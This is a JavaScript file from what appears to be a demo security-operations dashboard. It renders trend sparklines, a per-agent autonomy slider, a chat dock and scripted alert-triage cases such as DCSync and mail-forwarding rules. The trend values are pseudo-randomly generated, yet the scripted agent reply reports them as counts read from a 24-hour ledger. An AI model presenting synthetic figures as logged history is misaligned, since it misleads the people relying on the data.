      [...list.querySelectorAll('.autp-item.open')].forEach(x=>x.classList.remove('open'));
      [...list.querySelectorAll('.autp-row')].forEach(x=>x.setAttribute('aria-expanded','false'));
      if(!wasOpen){ item.classList.add('open'); item.querySelector('.autp-row').setAttribute('aria-expanded','true'); wire(); }
      syncHeads();
    });
    item.querySelector('.autp-open').addEventListener('click',ev=>{ ev.stopPropagation(); if(closeFn) closeFn(); App.openWatch(w.id); });
    list.appendChild(item);
  });
  const first=list.querySelector('.autp-item');
  if(first){ first.classList.add('open'); first.querySelector('.autp-row').setAttribute('aria-expanded','true'); wireAutSlider(first.querySelector('.autp-slider'), first.dataset.wid, 'pop'); first._wired=true; }
}
// A deterministic trend that builds up to the section's *current* count, so the chart's
// magnitude always matches the number shown — 1 thread reads as a low chart, not a busy one.
function ovTrend(key, cnt, n){
  key = String(key);
  let s = 0; for(let i=0;i<key.length;i++) s = (s*31 + key.charCodeAt(i)) >>> 0;
  const rnd = ()=>{ s = (s*1664525 + 1013904223) >>> 0; return s / 4294967296; };
  const out = [];
  for(let i=0;i<n;i++){
    const t = n>1 ? i/(n-1) : 1;                       // 0 (past) → 1 (now)
    const base = cnt * (0.2 + 0.8*t);                  // low early, rising toward now
    let v = Math.round(base + (rnd()-0.5) * Math.max(1, cnt));
    out.push(Math.max(0, Math.min(cnt, v)));
  }
  out[n-1] = cnt;                                       // most recent bar = current count
  return out;
}
function ovAxisDates(n){
  const end = new Date();
  const start = new Date(end.getTime() - 24*60*60*1000);
  const f = dt => dt.toLocaleTimeString(undefined,{hour:'2-digit',minute:'2-digit'});
  return { start: f(start), end: f(end), startLabel:'24h ago', endLabel:'Now' };
}
function ovSparkline(d, label, cnt, gmax){
  cnt = Math.max(0, cnt||0);
  const n = 14;
  const data = ovTrend(d, cnt, n);
  const max = Math.max(1, gmax||cnt||1);               // shared scale across all sections
  const W = 100, H = 24, PAD = 2.5;                    // viewBox units; PAD keeps the stroke inside
  const pts = data.map((v,i)=>{
    const x = n>1 ? (i/(n-1))*W : W;
    const y = PAD + (1 - v/max) * (H - PAD*2);
    return [x, y];
  });
  const line = pts.map(p=>p[0].toFixed(1)+','+p[1].toFixed(1)).join(' ');
  const area = `0,${H} ${line} ${W},${H}`;
  const endY = pts[pts.length-1][1];
  const dotTop = (endY/H*100).toFixed(1);
  const ax = ovAxisDates(n);
  return `<div class="ov-spark" style="position:relative" data-dec="${d}" data-lbl="${ovEsc(label||'')}" data-pts="${data.join(',')}" data-max="${max}" role="img" aria-label="${ovEsc((label||'')+' — trend over the last 24 hours. Click a point to investigate that window.')}"
    onmousemove="App.ovSparkMove(event,this)" onmouseleave="App.ovSparkLeave()" onclick="event.stopPropagation();App.ovSparkClick(event,this)">`
    + `<svg viewBox="0 0 ${W} ${H}" preserveAspectRatio="none" style="display:block;width:100%;height:100%;overflow:visible;pointer-events:none">`
    + `<polygon points="${area}" fill="var(--dec)" fill-opacity="0.10"></polygon>`
    + `<polyline points="${line}" fill="none" stroke="var(--dec)" stroke-width="1.5" stroke-linejoin="round" stroke-linecap="round" vector-effect="non-scaling-stroke"></polyline>`
    + `</svg>`
    + `<b style="position:absolute;right:-2px;top:calc(${dotTop}% - 2px);width:4px;height:4px;border-radius:50%;background:var(--dec);pointer-events:none"></b>`
    + `<b class="ov-spark-cursor" style="display:none"></b>`
    + `</div>`
    + `<div class="ov-spark-axis" aria-hidden="true"><span>${ax.startLabel}</span><span>${ax.endLabel}</span></div>`;
}
/* review fix 5 — drill into a sparkline window: hover shows the per-window count, click opens
   an ephemeral investigation chat scoped to that slice — works for historical points too. */
const ovEsc = s => String(s).replace(/&/g,'&amp;').replace(/"/g,'&quot;');
function ovBucketTime(i, n){
  const end = Date.now(), start = end - 24*60*60*1000;
  const t = new Date(start + (n>1 ? i/(n-1) : 1) * (end - start));
  return t.toLocaleTimeString(undefined,{hour:'2-digit',minute:'2-digit',hour12:false});
}
function ovBucketIdx(ev, el, n){
  const r = el.getBoundingClientRect();
  const f = Math.max(0, Math.min(1, (ev.clientX - r.left) / Math.max(1, r.width)));
  return Math.round(f * (n-1));
}
function ovTipEl(){
  let tip = document.getElementById('ovTip');
  if(!tip){ tip = document.createElement('div'); tip.id='ovTip'; tip.className='ovtip'; document.body.appendChild(tip); }
  return tip;
}
function ovQueueThreads(dec){
  const mode = state.mode||'dayshift';
  return Object.values(state.threads).filter(t=>t.mode===mode && t.type!=='chat' && decisionOf(t)===dec && ['open','awaiting','in-progress'].includes(t.status));
}
function ovInvestigate(dec, i, pts){
  const dm=DECISION_META[dec]||{label:dec};
  const n=pts.length||14;
  const now=i>=n-1;
  const t0=ovBucketTime(Math.max(0,i-1),n), t1=ovBucketTime(i,n);
  const v=pts[i]||0, cur=pts[n-1]||0;
  const tops=ovQueueThreads(dec).slice(0,2);
  const mode=state.mode||'dayshift';
  const id='ov-drill-'+dec;
  state.threads[id]={ id, mode, type:'chat', title:`${dm.label} queue — ${now?'now':t0+'–'+t1}`, messages:[], suggestions:[], status:null, severity:null, owner:'you', assignees:[], mentions:[], evidence:[], timeline:[], actions:[], narrative:'', recordId:null };
  const t=state.threads[id];
  state.activeId=id; state.navView='chats'; state.inspectorOpen=false;
  t.messages.push({role:'user', text: now?`What's in the ${dm.label} queue right now?`:`What drove the ${dm.label} queue between ${t0} and ${t1}?`});
  renderAll();
  thinking('Reading the queue ledger…', ()=>{
    const drivers=tops.length?` Driving it: ${tops.map(x=>`<b>${x.title}</b>${x.recordId?` (${x.recordId})`:''}`).join(' and ')}.`:'';
    const hist=now?'':` That's a historical read from the 24-hour ledger — the queue is at <b>${cur}</b> now.`;
    pushMsg({role:'agent',name:false,prose: now
      ? `The <b>${dm.label}</b> queue has <b>${v}</b> decision${v===1?'':'s'} in it right now.${drivers} Every entry and exit today is in the decision History.`
      : `Between <b>${t0}</b> and <b>${t1}</b> the <b>${dm.label}</b> queue held <b>${v}</b> decision${v===1?'':'s'}.${drivers}${hist} Every entry and exit in that window is logged in the decision History.`});
    const chips=[];
    if(tops[0]) chips.push({label:`Open ${tops[0].recordId||tops[0].title.slice(0,28)}`,icon:'doc',fn:()=>App.openThread(tops[0].id)});
    chips.push({label:`Jump to the ${dm.label} queue`,icon:'target',fn:()=>{ App.goBrief(); setTimeout(()=>App.scrollToSec(dec),140); }});
    chips.push({label:'Open decision History',icon:'clock',fn:()=>{ App.goBrief(); setTimeout(()=>App.historyOpen(),140); }});
    setSuggestions(chips);
  }, 800);
}
// classify an affected surface by type → glyph (user, host, db, group, identity, …)
function surfaceIcon(label){
  const s = String(label||''), l = s.toLowerCase();
  if(/^svc[-_.]|[-_.]svc[-_.]|\bsvc\b|service account|\bdaemon\b/.test(l)) return 'bot';          // service / machine account
  if(/@/.test(s)) return 'user';                                                                     // human account (email)
  if(/admin|\bgroup\b|\busers?\b|contractor|\bteam\b|\brole\b|everyone/.test(l)) return 'users'; // group / role bucket
  if(/\bsso\b|okta|oauth|\bauth\b|\bidp\b|\bsaml\b|\bldap\b|identity|credential|\bmfa\b/.test(l)) return 'lock'; // identity / auth
  if(/kafka|kinesis|stream|broker|\bqueue\b/.test(l)) return 'streams';                              // streaming / messaging
  if(/\bvpn\b|gateway|\bgw\b|\bdns\b|subnet|firewall|proxy|\brouter\b|egress|ingress/.test(l)) return 'network'; // network
  if(/\bdb\b|database|\bsql\b|postgres|mysql|mongo|redis|maria|oracle|warehouse/.test(l)) return 'db'; // database
  if(/\bnas\b|fileshare|\bshare\b|storage|bucket|\bs3\b|volume|backup/.test(l)) return 'host';      // storage host
  if(/^[a-z][\w.]*(?:-[\w.]+)+$/.test(l) || /\bhost\b|server|node|\bvm\b|endpoint|workstation/.test(l)) return 'host'; // generic host
  return 'asset';
}
function briefOverview(mode, now, motion, done, targets, present, groups, counts){
  counts = counts || {};
  targets = targets || {};
  present = present || []; groups = groups || {};
  const active = now.concat(motion);
  if(!active.length) return '';
  // affected surface — the primary entity/asset of each active thread
  const seen = new Set(); const affected = [];
  // an affected surface is a real asset/account — a hostname, email, or named system —
  // not a status descriptor ("staged", "4 min", "no change ticket").
  const NAMED_SURFACES = /^(Domain Admins|OAuth app|kafka|VPN|payments-gw)$/i;
  const isSurface = s =>
    /@/.test(s) ||                                  // accounts: cfo@corp
    /^[A-Za-z][\w.]*(?:-[\w.]+)+$/.test(s) ||        // hosts: Sales-NAS, FIN-DB-02, okta-sso
    /^\d+\s+(?:users|contractors|hosts?)$/i.test(s) ||// 18 users, 3 contractors
    NAMED_SURFACES.test(s);
  active.forEach(t=>{
    const ai = AI_RADAR[t.id] || {};
    const cls = radarPrio(ai.score||0).cls;
    (ai.chips || []).forEach(label=>{
      // a "N users" aggregate expands to one badge per individual account
      if(/^\d+\s+users$/i.test(label) && Array.isArray(ai.victims) && ai.victims.length){
        ai.victims.forEach(u=>{ if(u && !seen.has(u)){ seen.add(u); affected.push({ label:u, cls }); } });
        return;
      }
      if(!label || seen.has(label) || !isSurface(label)) return;
      seen.add(label);
      affected.push({ label, cls });
    });
  });
  const showAll = !!state.surfaceShowAll;
  const shown = showAll ? affected : affected.slice(0,6);
  const extra = affected.length - shown.length;
  const sfs = (state.surfaceFilters||[]);
  const q = showAll ? (state.surfaceSearch||'').trim().toLowerCase() : '';
  const escAttr = s => String(s).replace(/&/g,'&amp;').replace(/"/g,'&quot;');
  const anyMatch = !q || shown.some(a=>a.label.toLowerCase().includes(q));
  const countPool = Object.values(state.threads).filter(t=>(t.mode||'dayshift')===mode && t.type!=='chat' && t.status!=='closed');
  const countFor = label => countPool.filter(t=>{ const ai=AI_RADAR[t.id]||{}; return ((ai.chips||[]).includes(label))||((ai.victims||[]).includes(label)); }).length;
  const chips = shown.map(a=>{
    const n = countFor(a.label);
    const hide = (q && !a.label.toLowerCase().includes(q)) ? 'display:none' : '';
    return `<button class="ov-chip ov-chip-${a.cls}${sfs.includes(a.label)?' on':''}" title="${sfs.includes(a.label)?'Remove this filter':'Filter the queue to this surface'}" data-label="${escAttr(a.label)}" style="${hide}" onclick="App.surfaceFilter('${a.label.replace(/'/g,"\\'")}')"><span class="ov-chip-ic">${ic(surfaceIcon(a.label),13)}</span>${a.label}${n?`<span class="ov-chip-n">${n}</span>`:''}${sfs.includes(a.label)?ic('x',11):''}</button>`;
  }).join('')
    + (extra>0 ? `<button class="ov-chip ov-more" onclick="App.expandSurface()">+${extra} more</button>` : '')
    + (showAll && affected.length>6 ? `<button class="ov-chip ov-more ov-collapse"${q?' style="display:none"':''} onclick="App.expandSurface()">Show less</button>` : '')
    + (sfs.length ? `<button class="ov-chip ov-more" title="Show everything again" onclick="App.surfaceFilter(null)">${ic('x',11)} Clear filter — showing ${counts.filtered!=null?counts.filtered:''} of ${counts.all!=null?counts.all:''}</button>` : '');
  const t = new Date().toLocaleTimeString(undefined,{hour:'2-digit',minute:'2-digit'});
  /* sparkline scale reflects live activity — waiting decisions plus work in motion */
  const secCounts = {}; present.forEach(d=>{ secCounts[d] = (groups[d]||[]).filter(t=>['open','awaiting','in-progress'].includes(t.status)).length; });
  const gmax = Math.max(1, ...present.map(d=>secCounts[d]));
  const secCells = present.map(d=>{
    const dm = DECISION_META[d]; const items = groups[d]||[];
    const waiting = items.filter(t=>t.status==='open'||t.status==='awaiting');
    const cnt = waiting.length;   /* decisions waiting — these sum to the headline */
    const sevCount = s => waiting.filter(t=>t.severity===s).length;
    const crit=sevCount('Critical'), high=sevCount('High'), med=sevCount('Medium'), low=sevCount('Low');
    const motionN = items.filter(t=>t.status==='in-progress').length;
    const stat=[];
    if(crit) stat.push(`<span class="ov-secsev"><i class="ovs-dot crit"></i>${crit} critical</span>`);
    if(high) stat.push(`<span class="ov-secsev"><i class="ovs-dot high"></i>${high} high</span>`);
    if(!crit && !high && med) stat.push(`<span class="ov-secsev"><i class="ovs-dot med"></i>${med} medium</span>`);
    if(!crit && !high && !med && low) stat.push(`<span class="ov-secsev"><i class="ovs-dot"></i>${low} low</span>`);
    if(motionN) stat.push(`<span class="ov-secsev"><i class="ovs-dot mtn"></i>${motionN} in motion</span>`);
    return `<button class="ov-sec ov-link" style="--dec:${dm.color}" onclick="App.scrollToSec('${d}')">
      <div class="ov-sec-top"><span class="ov-secdot"></span><span class="ov-sec-title">${dm.label}</span></div>
      ${ovSparkline(d, dm.label, cnt+motionN, gmax)}
      <div class="ov-sec-figure"><b class="ov-secnum">${cnt}</b></div>
      ${stat.length?`<div class="ov-secstat">${stat.join('')}</div>`:''}
      <span class="ov-secsub">${dm.blurb}</span>
    </button>`;
  }).join('');
  return `<div class="ov">
    <div class="ov-secs">${secCells}</div>
    <div class="ov-foot">
      <div class="ov-block ov-affected">
        <div class="ov-affected-head">
          <span class="ov-k">Affected surface</span>
          ${showAll ? `<div class="ov-surface-search">${ic('search',13)}<input type="text" class="ov-surface-input" placeholder="Filter surfaces…" value="${escAttr(state.surfaceSearch||'')}" oninput="App.surfaceSearchInput(this.value)" autocomplete="off" spellcheck="false"><button class="ov-surface-x" title="Clear" onclick="App.surfaceSearchClear()" style="${q?'':'display:none'}">${ic('x',12)}</button></div>` : ''}
        </div>
        <div class="ov-chips">${chips||'<span class="ov-chip ov-more">Nothing exposed</span>'}</div>
        ${showAll ? `<div class="ov-surface-empty" style="${(q && !anyMatch)?'':'display:none'}">No surfaces match your filter.</div>` : ''}
      </div>
    </div>
  </div>`;
}
function briefStarters(mode){
  return mode==='nightshift' ? [
    {label:'What changed right before the checkout regression?',icon:'rotate'},
    {label:'Show me everything still firing',icon:'siren'},
    {label:'Summarize the overnight timeline',icon:'list'},
  ] : [
    {label:'Spike in failed logins on the finance subnet (24h)',icon:'db'},
    {label:'Show critical alerts from the last hour',icon:'alert'},
    {label:'Hunt for suspicious PowerShell',icon:'terminal'},
  ];
}
/* ============================================================
   AUTONOMY CONTROL — one shared 5-stop slider, used by the
   settings-gear popover on the brief page AND inline on every
   agent card. Drag, click a stop, or use arrow keys. */
const AUT_LABELS=['Suggest only','Reads auto','Drafts auto','Acts · gated','Acts · trusted'];
const AUT_STOPS=['Suggest','Read','Draft','Act','Trusted'];
const AUT_DESCS=[
  'Proposes everything — nothing runs without a click, including reads.',
  'Queries and enrichment run on their own; drafts and actions wait for you.',
  'Investigates and drafts autonomously; every action still waits for review.',
  'Runs routine actions itself; world-changing actions stay gated for approval.',
  'Also auto-runs allow-listed actions — reversible, scoped, fully audited.'
];
const AUT_N=AUT_LABELS.length;
const AGENT_META={
  dayshift:{name:'NotDaybreak',role:'Security agent',icon:'sun'},
  nightshift:{name:'NightShift',role:'Observability agent',icon:'moon'},
  fraud:{name:'Fraud signals',role:'Risk & fraud agent',icon:'sparkle'},
};
const AUT_DEFAULTS={dayshift:4,nightshift:3,fraud:1,floor:3,officer:4,dark:5,deep:3};
function autonomyOf(id){ const a=state.autonomy||{}; return a[id]||AUT_DEFAULTS[id]||1; }
let _autPop=null,_autAnchor=null,_autUnbind=null,_autWires={};
function closeAutPop(){
  if(_autUnbind){ _autUnbind(); _autUnbind=null; }
  if(_autPop){ _autPop.remove(); _autPop=null; }
  if(_autAnchor){ _autAnchor.classList.remove('pop-on'); _autAnchor=null; }
}
function commitAutonomy(id,lvl){
  if(!state.autonomy) state.autonomy=Object.assign({},AUT_DEFAULTS);
  const prev=autonomyOf(id);
  state.autonomy[id]=lvl;
  // keep every mounted control for this agent in sync (card slider + popover)
  Object.keys(_autWires).forEach(k=>{
    if(k.indexOf(id+'::')!==0) return;
    const w=_autWires[k];
    if(w && w.root && w.root.isConnected){ try{ w.refresh(); }catch(e){} }
    else delete _autWires[k];
  });
  if(prev!==lvl){
    const name=((WATCHES.find(w=>w.id===id))||AGENT_META[id]||{}).name||'Watch';
    toast('ok','Autonomy updated',`${name} set to “${AUT_LABELS[lvl-1]}”.`);
  }
}
function autSliderHTML(){
  const pct=i=>((i/(AUT_N-1))*100).toFixed(1);
  const stops=Array.from({length:AUT_N},(_,i)=>`<span class="aut-stop" style="left:${pct(i)}%"></span>`).join('');
  const labs=AUT_STOPS.map((s,i)=>`<span data-l="${i+1}" class="${i===0?'first':(i===AUT_N-1?'last':'')}" style="left:${pct(i)}%">${s}</span>`).join('');
  return `<div class="aut-slider" tabindex="0" role="slider" aria-label="Autonomy level" aria-valuemin="1" aria-valuemax="${AUT_N}">
    <div class="aut-rail"><i class="aut-fill"></i>${stops}<span class="aut-thumb"></span></div>
    <div class="aut-stopls">${labs}</div>
  </div>`;
}
function wireAutSlider(root,id,tag){
  const q=s=>root.querySelector(s);
  const slider=q('.aut-slider'); if(!slider) return null;
  const rail=q('.aut-rail'), thumb=q('.aut-thumb'), fill=q('.aut-fill');
  const stops=[...root.querySelectorAll('.aut-stop')];
  const labels=[...root.querySelectorAll('.aut-stopls span')];
  const nameEl=q('.aut-read b'), descEl=q('.aut-read p'), lvlEl=q('.aut-h-lv');
  let lvl=autonomyOf(id);
  function paint(l,f){                       // l: snapped level · f: continuous fraction while dragging
    const ff=(f!=null)?f:(l-1)/(AUT_N-1);
    thumb.style.left=(ff*100)+'%'; fill.style.width=(ff*100)+'%';
    stops.forEach((s,i)=>s.classList.toggle('filled',(i/(AUT_N-1))<=ff+0.001));
    labels.forEach((s,i)=>s.classList.toggle('on',i===l-1));
    if(nameEl) nameEl.textContent=AUT_LABELS[l-1];
    if(descEl) descEl.textContent=AUT_DESCS[l-1];
    if(lvlEl) lvlEl.textContent=l+' / '+AUT_N;
    slider.setAttribute('aria-valuenow',l);
    slider.setAttribute('aria-valuetext',AUT_LABELS[l-1]);
  }
  const fromX=x=>{ const b=rail.getBoundingClientRect(); return Math.min(1,Math.max(0,(x-b.left)/b.width)); };
  const snap=f=>1+Math.round(f*(AUT_N-1));
  const commit=l=>{ paint(l); if(l!==lvl){ lvl=l; commitAutonomy(id,l); } };
  let dragging=false;
  rail.addEventListener('pointerdown',ev=>{
    ev.preventDefault(); ev.stopPropagation(); dragging=true; rail.classList.add('drag');
    try{ rail.setPointerCapture(ev.pointerId); }catch(e){}
    const f=fromX(ev.clientX); paint(snap(f),f);
  });
  rail.addEventListener('pointermove',ev=>{ if(!dragging) return; const f=fromX(ev.clientX); paint(snap(f),f); });
  rail.addEventListener('pointerup',ev=>{ if(!dragging) return; dragging=false; rail.classList.remove('drag'); commit(snap(fromX(ev.clientX))); });
  rail.addEventListener('pointercancel',()=>{ if(!dragging) return; dragging=false; rail.classList.remove('drag'); paint(lvl); });
  labels.forEach(sp=>sp.addEventListener('click',ev=>{ ev.stopPropagation(); commit(+sp.dataset.l); }));
  slider.addEventListener('keydown',ev=>{
    let l=lvl;
    if(ev.key==='ArrowLeft'||ev.key==='ArrowDown') l=Math.max(1,lvl-1);
    else if(ev.key==='ArrowRight'||ev.key==='ArrowUp') l=Math.min(AUT_N,lvl+1);
    else if(ev.key==='Home') l=1;
    else if(ev.key==='End') l=AUT_N;
    else return;
    ev.preventDefault(); commit(l);
  });
  paint(lvl);
  const w={ root, refresh(){ lvl=autonomyOf(id); paint(lvl); } };
  _autWires[id+'::'+(tag||'x')]=w;
  return w;
}
function toggleAutPop(anchor,agentId){
  const same=(_autAnchor===anchor);
  closeAutPop();
  if(same) return;
  const syncHeads=(list)=>{
    [...list.querySelectorAll('.autp-item')].forEach(it=>{
      const lvl=autonomyOf(it.dataset.wid);
      const m=it.querySelector('.autp-row .aut'); if(m) m.outerHTML=autMeter(lvl);
      const l=it.querySelector('.autp-row .autp-lvl'); if(l) l.textContent=AUT_LABELS[lvl-1];
    });
  };
  const pop=el(`<div class="aut-pop autp" role="dialog" aria-label="Watches and autonomy">
    <div class="aut-h">
      <span class="aut-h-ic">${ic('eye',14)}</span>
      <div class="aut-h-t"><b>Watches</b><span>autonomy is set per watch — adjust it here, or open full settings</span></div>
    </div>
    <div class="autp-list"></div>
    <div class="aut-f">
      <a class="aut-link" onclick="App.autPopClose();App.go('agents')">${ic('settings',12)} All watch settings<span class="lk-arr">${ic('arrow',12)}</span></a>
    </div>
  </div>`);
  const list=pop.querySelector('.autp-list');
  WATCHES.filter(w=>!w.draft).forEach(w=>{
    const lvl=autonomyOf(w.id);
    const item=el(`<div class="autp-item" data-wid="${w.id}" style="--tone:${w.color}">
      <button class="autp-row ${w.on?'':'off'}" type="button" aria-expanded="false">
        <span class="wdot" style="background:${w.color}"></span>
        <span class="autp-n">${w.name}</span>
        <span class="autp-win">${w.on?w.window:'Paused'}</span>
        ${autMeter(lvl)}
        <span class="autp-lvl">${AUT_LABELS[lvl-1]}</span>
        <span class="autp-go">${ic('chevron',12)}</span>
      </button>
      <div class="autp-body">
        <div class="ag-aut2 autp-slider">${autSliderHTML()}<div class="aut-read sm"><b></b><p></p></div></div>
        <a class="autp-open">${ic('settings',11)} Open ${w.name} settings</a>
      </div>
    </div>`);
    const wire=()=>{ if(!item._wired){ wireAutSlider(item.querySelector('.autp-slider'), w.id, 'pop'); item._wired=true; } };
    item.querySelector('.autp-row').addEventListener('click',ev=>{
      ev.stopPropagation();
      const wasOpen=item.classList.contains('open');
      [...list.querySelectorAll('.autp-item.open')].forEach(x=>x.classList.remove('open'));
      [...list.querySelectorAll('.autp-row')].forEach(x=>x.setAttribute('aria-expanded','false'));
      if(!wasOpen){ item.classList.add('open'); item.querySelector('.autp-row').setAttribute('aria-expanded','true'); wire(); }
      syncHeads(list);
    });
    item.querySelector('.autp-open').addEventListener('click',ev=>{ ev.stopPropagation(); closeAutPop(); App.openWatch(w.id); });
    list.appendChild(item);
  });
  const first=list.querySelector('.autp-item');
  if(first){ first.classList.add('open'); first.querySelector('.autp-row').setAttribute('aria-expanded','true'); wireAutSlider(first.querySelector('.autp-slider'), first.dataset.wid, 'pop'); first._wired=true; }
  document.body.appendChild(pop);
  const r=anchor.getBoundingClientRect();
  const ph=pop.offsetHeight||280;
  let top=r.bottom+8;
  if(top+ph>window.innerHeight-10) top=Math.max(10, r.top-8-ph);
  pop.style.top=top+'px';
  pop.style.right=Math.max(10, window.innerWidth-r.right)+'px';
  anchor.classList.add('pop-on'); _autPop=pop; _autAnchor=anchor;
  const down=ev=>{ if(!pop.contains(ev.target) && ev.target!==anchor && !anchor.contains(ev.target)) closeAutPop(); };
  const key=ev=>{ if(ev.key==='Escape') closeAutPop(); };
  const scr=ev=>{ if(pop.contains(ev.target)) return; closeAutPop(); };
  const rsz=()=>closeAutPop();
  document.addEventListener('mousedown',down,true);
  document.addEventListener('keydown',key,true);
  document.addEventListener('scroll',scr,true);
  window.addEventListener('resize',rsz);
  _autUnbind=()=>{
    document.removeEventListener('mousedown',down,true);
    document.removeEventListener('keydown',key,true);
    document.removeEventListener('scroll',scr,true);
    window.removeEventListener('resize',rsz);
  };
  requestAnimationFrame(()=>{ try{ const s=pop.querySelector('.aut-slider'); if(s) s.focus({preventScroll:true}); }catch(e){} });
}
function briefComposer(){
  const mode=state.mode||'dayshift';
  const agentName=mode==='nightshift'?'NightShift':'NotDaybreak';
  const chips=briefStarters(mode).map((s,i)=>`<button class="sg" style="animation-delay:${i*55}ms" onclick="App.briefStart(${i})">${s.icon?ic(s.icon,13):''}${s.label}</button>`).join('');
  const pinned = !!state.chatPinned;
  return `<div class="chat-dock${pinned?' pinned':''}" id="chatDock" onmouseenter="App.chatDockEnter()" onmouseleave="App.chatDockLeave()">
    <button class="chat-badge" title="Ask ${agentName}" onclick="App.chatDockToggle()">
      <span class="chat-badge-ic">${ic(mode==='nightshift'?'moon':'sun',17)}</span>
      <span class="chat-badge-lbl">Ask ${agentName}</span>
    </button>
    <div class="chat-panel">
      <div class="chat-panel-head">
        <span class="chat-panel-title"><span class="chat-panel-ic">${ic(mode==='nightshift'?'moon':'sun',15)}</span>Ask ${agentName}</span>
      </div>
      <div class="suggest">${chips}</div>
      <div class="composer-box">
        <textarea id="briefInput" rows="1" placeholder="Ask ${agentName}, or give it a task…" onkeydown="App.briefKey(event)" oninput="autoGrow(this)"></textarea>
        <button class="send" title="Send" onclick="App.briefSend()">${ic('send',16)}</button>
      </div>
      <div class="composer-foot"><span class="auto-pill">${ic('check',11)} Reads run automatically</span> · drafts &amp; actions ask first</div>
    </div>
  </div>`;
}
function briefRecapCard(mode){
  const B=BRIEF[mode]; const evs=briefEvents(mode,'active').slice(0,3);
  return `<div class="brc">
    <div class="brc-h">${ic(B.icon,13)} ${B.headline}</div>
    <div class="brc-state">${B.state.map(e=>`<span class="brc-chip">${ic(e.icon,10)} ${e.name}</span>`).join('')}</div>
    <div class="brc-risk"><span class="brc-r crit">${B.risk.critical} critical</span><span class="brc-r high">${B.risk.high} high</span><span class="brc-r">${B.risk.medium} medium</span><span class="brc-r">${B.risk.low} low</span></div>
    ${evs.map(t=>`<div class="brc-ev" onclick="App.openThread('${t.id}')"><span>${ic('maximize',11)} ${t.title}</span><span class="sev ${sevClass(t.severity)}">${t.severity||'—'}</span></div>`).join('')}
  </div>`;
}
function startFromBrief(text){
  if(text && /show critical alerts from the last hour/i.test(text) && (state.mode||'dayshift')==='dayshift'){ startTriage(); return; }
  const mode=state.mode||'dayshift'; const B=BRIEF[mode];
  const id = mode==='nightshift' ? 'night-brief' : 'day-brief';
  if(!state.threads[id]) state.threads[id]={ id, mode, type:'chat', title: mode==='nightshift'?'Significant events — triage':'Active threats — triage', messages:[], suggestions:[], status:null, severity:null, owner:'you', assignees:[], mentions:[], evidence:[], timeline:[], actions:[], narrative:'', recordId:null };
  const t=state.threads[id];
  t.messages=[{role:'agent', briefcard:mode}];
  state.activeId=id; state.navView='chats'; state.inspectorOpen=false;
  if(text) t.messages.push({role:'user',text});
  renderAll();
  if(text){ thinking('Reviewing the brief…', ()=>{ pushMsg({role:'agent',name:false,prose:B.pickup}); setSuggestions(briefSuggestions(mode)); }, 850); }
  else setSuggestions(briefSuggestions(mode));
}
function briefSuggestions(mode){
  if(mode==='nightshift') return [
    {label:'Execute the rollback to v2.8.0',icon:'rotate',act:true,fn:()=>toast('warn','Gated action','A rollback changes production — this would show blast radius and ask to confirm.')},
    {label:'Open the full investigation',icon:'investigation',fn:()=>App.openThread('night-1')},
    {label:'What else is critical right now?',icon:'siren',fn:()=>App.setNavView('brief')},
  ];
  return [
    {label:'Revoke the active sessions',icon:'shield',act:true,fn:()=>toast('warn','Gated action','This asks before it revokes the live sessions on CASE-2047.')},
    {label:'Investigate the token lineage',icon:'terminal',fn:()=>App.openThread('day-r3')},
    {label:'What else needs triage?',icon:'alert',fn:()=>App.setNavView('brief')},
  ];
}
/* ============================================================ ALERT TRIAGE (scripted, launched from the Brief) */
const TRIAGE_ALERTS=[
  {id:'a1', sev:'Critical', rule:'DCSync — directory replication', host:'FIN-WS-09', mitre:'T1003.006', verdict:'malicious', vlabel:'Likely real',
    line:'Workstation requested replication of krbtgt + 3 privileged accounts'},
  {id:'a2', sev:'High', rule:'LSASS memory access (procdump)', host:'HR-WS-14', mitre:'T1003.001', verdict:'benign', vlabel:'Sanctioned change',
    line:'Crash-dump under change CHG-4471 — assigned engineer, in-window'},
  {id:'a3', sev:'Critical', rule:'External mail-forwarding rule', host:'r.patel@corp', mitre:'T1114.003', verdict:'malicious', vlabel:'Likely real',
    line:'New rule → personal Gmail from an unfamiliar geo, user on PTO'},
  {id:'a4', sev:'High', rule:'Defender real-time protection disabled', host:'SALES-WS-07', mitre:'T1562.001', verdict:'benign', vlabel:'Sanctioned change',
    line:'AV toggled inside SCCM patch window CHG-4460'},
  {id:'a5', sev:'High', rule:'Beaconing to low-reputation domain', host:'DEV-WS-31', mitre:'T1071.001', verdict:'suspicious', vlabel:'Needs a call',
    line:'Regular-interval TLS to a newly-registered domain'},
  {id:'a6', sev:'Critical', rule:'Phishing link clicked, creds entered', host:'2 Finance users', mitre:'T1566.002', verdict:'contained', vlabel:'Auto-contained',
    line:'Lookalike domain — IdP already force-reset both, no MFA approvals'},
];
const TRIAGE_NEXT={a1:'a2',a2:'a3',a3:'batch'};
const TRIAGE_CASE={
  a1:{ threadId:'day-case-dcsync', recordId:'CASE-2054', title:'DCSync — credential replication from FIN-WS-09',
    opening:`Case opened from the alert triage. Here's what we have: <b>FIN-WS-09</b> issued a directory-replication request for <code>krbtgt</code> and three privileged accounts under <code>svc-fin-report</code> at 08:47 UTC. Workstations don't replicate — this is DCSync (T1003.006), an attempt to harvest credential material and forge tickets. Replication was still active at triage. I've staged <b>host isolation</b> and <b>krbtgt rotation</b> as the recommended first actions.`,
    situation:`At 08:47 UTC, <b>FIN-WS-09</b> — a finance workstation — issued a directory-service replication (DRSUAPI) request for <code>krbtgt</code>, <code>Administrator</code>, <code>svc-sql-admin</code> and <code>bkp-admin</code>, authenticated as <code>svc-fin-report</code>. Replication is a domain-controller operation; a workstation performing it is the signature of <b>DCSync</b> (T1003.006). Whoever controls <code>svc-fin-report</code> is harvesting credential material — including the <code>krbtgt</code> hash, which enables Golden Ticket forgery. Requests were still arriving at triage time.`,
    evidence:[
      {id:'e-repl', t:'krbtgt + 3 privileged accounts replicated', src:'Discover · DS replication', icon:'db', why:'Workstation issued DRSUAPI for krbtgt — DCSync signature', snap:'4 objects replicated to FIN-WS-09 by svc-fin-report, 08:47 UTC', live:true},
      {id:'e-acct', t:'svc-fin-report acting outside its baseline', src:'Entities · account', icon:'user', why:'A reporting service account has never replicated directory data', snap:'svc-fin-report: report-generation only; no replication in 90d', live:true},
      {id:'e-host', t:'FIN-WS-09 is a workstation, not a DC', src:'Entities · host', icon:'host', why:'Replication from a workstation is illegitimate by design', snap:'FIN-WS-09: standard finance endpoint, no DC role', live:true},
      {id:'e-active', t:'Replication still active at triage', src:'Discover · live', icon:'refresh', why:'Last request 38s before triage — an ongoing harvest', snap:'Most recent DRSUAPI request 09:40 UTC', live:true},
    ],
    timeline:[
